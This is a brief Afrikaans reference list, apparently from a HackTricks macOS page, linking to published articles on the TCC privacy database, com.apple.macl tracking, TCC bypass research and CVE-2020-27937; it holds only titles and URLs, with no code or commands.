- [1] [‘n Diepgaande ondersoek na macOS TCC.db - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script om com.apple.macl na te spoor (Gist deur brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Spoor com.apple.macl na en hanteer dit](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Om macOS TCC-gebruikersprivaatheidsbeskerming per ongeluk en doelbewus te omseil](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Verander die tuisgids en omseil TCC, oftewel CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
{{#include ../../../../banners/hacktricks-training.md}}
